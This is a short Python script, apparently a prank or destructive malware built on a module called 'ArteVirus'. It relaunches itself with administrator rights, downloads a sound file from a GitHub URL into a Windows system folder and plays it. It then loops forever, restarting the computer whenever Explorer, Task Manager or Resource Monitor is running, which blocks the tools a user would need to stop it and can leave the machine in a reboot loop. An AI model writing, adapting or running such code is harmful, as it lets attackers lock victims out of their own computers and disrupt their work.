import ArteVirus
import ctypes
import sys

if not ArteVirus.is_admin_windows():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit(0)

url4 = "https://raw.githubusercontent.com/JustARocketGame/aaaaaaaaaaa/main/error.mp3"
f4 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\error.mp3", url4)

ArteVirus.play_music(f4)

while True:
    if ArteVirus.is_process_running("explorer.exe") or ArteVirus.is_process_running("taskmgr.exe") or ArteVirus.is_process_running("resmon.exe"):
        ArteVirus.restart_pc()